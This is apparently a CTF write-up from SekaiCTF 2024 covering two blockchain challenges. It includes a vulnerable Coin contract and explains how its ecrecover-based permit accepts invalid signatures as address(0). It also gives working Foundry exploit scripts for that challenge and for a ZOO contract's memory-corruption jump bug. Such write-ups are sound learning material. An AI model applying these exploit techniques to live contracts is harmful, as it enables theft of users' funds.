```
title: "Blockchain writeup and skills learning in sekaictf 2024"
date: 2024-08-26T21:50:19+08:00
```

## Play to Earn

```solidity
pragma solidity 0.8.25;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/cryptography/EIP712.sol";

contract Coin is Ownable, EIP712 {
    string public constant name     = "COIN";
    string public constant symbol   = "COIN";
    uint8  public constant decimals = 18;
    bytes32 constant PERMIT_TYPEHASH = keccak256(
        "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
    );

    event  Approval(address indexed src, address indexed guy, uint wad);
    event  Transfer(address indexed src, address indexed dst, uint wad);
    event  Deposit(address indexed dst, uint wad);
    event  Withdrawal(address indexed src, uint wad);
    event  PrivilegedWithdrawal(address indexed src, uint wad);

    mapping (address => uint)                       public  nonces;
    mapping (address => uint)                       public  balanceOf;
    mapping (address => mapping (address => uint))  public  allowance;

    constructor() Ownable(msg.sender) EIP712(name, "1") {}

    fallback() external payable {
        deposit();
    }

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw(uint wad) external {
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad;
        payable(msg.sender).transfer(wad);
        emit Withdrawal(msg.sender, wad);
    }

    function privilegedWithdraw() onlyOwner external {
        uint wad = balanceOf[address(0)];
        balanceOf[address(0)] = 0;
        payable(msg.sender).transfer(wad);
        emit PrivilegedWithdrawal(msg.sender, wad);
    }

    function totalSupply() public view returns (uint) {
        return address(this).balance;
    }

    function approve(address guy, uint wad) public returns (bool) {
        allowance[msg.sender][guy] = wad;
        emit Approval(msg.sender, guy, wad);
        return true;
    }

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external {
        require(block.timestamp <= deadline, "signature expired");
        bytes32 structHash = keccak256(
            abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline)
        );
        bytes32 h = _hashTypedDataV4(structHash);
        address signer = ecrecover(h, v, r, s);
        require(signer == owner, "invalid signer");
        allowance[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function transfer(address dst, uint wad) public returns (bool) {
        return transferFrom(msg.sender, dst, wad);
    }

    function transferFrom(address src, address dst, uint wad)
        public
        returns (bool)
    {
        require(balanceOf[src] >= wad);

        if (src != msg.sender && allowance[src][msg.sender] != type(uint256).max) {
            require(allowance[src][msg.sender] >= wad);
            allowance[src][msg.sender] -= wad;
        }

        balanceOf[src] -= wad;
        balanceOf[dst] += wad;

        emit Transfer(src, dst, wad);

        return true;
    }
}

```

​	实际上非常明显的漏洞点：初始化时将Token转给了address(0)，并且使用ecrecover进行permit操作。ecrecover 实际是对precompiled contract 0x01的引用，在遇到错误/非法签名时不会revert而是返回address(0)[^1]。所以只要提交一个非法签名，即可获取address(0)的“许可”。

[^1]: https://docs.soliditylang.org/en/latest/units-and-global-variables.html#mathematical-and-cryptographic-functions

exploit script:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
interface Coin {
    function permit(address owner,address spender,uint256 value,uint256 deadline,uint8 v,bytes32 r,bytes32 s) external ;
    function transferFrom(address src, address dst, uint wad) external returns (bool);
    function withdraw(uint wad) external;
}
interface Setup {
    function register() external;
}
contract Solve is Script{
    function run() external {
        vm.startBroadcast();
        address setup = address(0xAec731387Caf84F37b5336D2eB3aC0d08D803e9D);
        Setup(setup).register();
        address player = address(uint160(uint256(vm.load(setup, bytes32(uint256(2))))));
        address coin = address(uint160((uint256(vm.load(setup, bytes32(0))))));
        Coin(coin).permit(
            address(0),
            address(player),
            19 ether,
            ~uint256(0),
            uint8(0),
            bytes32(0),
            bytes32(0)
        );
        Coin(coin).transferFrom(address(0), address(player), 19 ether);
        Coin(coin).withdraw(19 ether);
        console.log(address(player).balance);
    }
}
```

## ZOO

有趣的二进制利用。

0x30刚好可以把下一个结构体中的头部扒拉到`local_animals + k* idx`可访问的位置，即可改变0x20接下来使用的temp值，而0x20中又存在mstore操作，于是可以对任意内存进行写入操作。debug发现0xa0是跳转地址，构造覆盖即可任意地址(JUMPDEST)JUMP。

改到0x323覆盖跳转地址，绕过pause限制。需要然后通过覆盖修改idx，使得最终写入槽为1。

Solve.sol

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.25;

import "../src/ZOO.sol";
import "../src/Setup.sol";
import {Script} from "forge-std/Script.sol";

import {console} from "forge-std/console.sol";

contract Solve is Script{
    function run() external {
        vm.startBroadcast();
        address zoo = address(Setup(0x37734ca5F84293358B9150A9357a0Fd331d24F46).zoo());
        // bytes memory data = abi.encode(
        //     // bytes32(0x100000000080 3007 2007220375)
                            
        //     bytes32(0x100000000080300720072200d400000000000000000000000000000000000000),
        //     bytes32(0)
        // );
        bytes memory data = abi.encodePacked(
            bytes32(0x1000000000803007200722032300000000000000000000000000000000000000)
        );
        (bool s,) = address(zoo).call(data);
        console.log(s);
    }

}
```

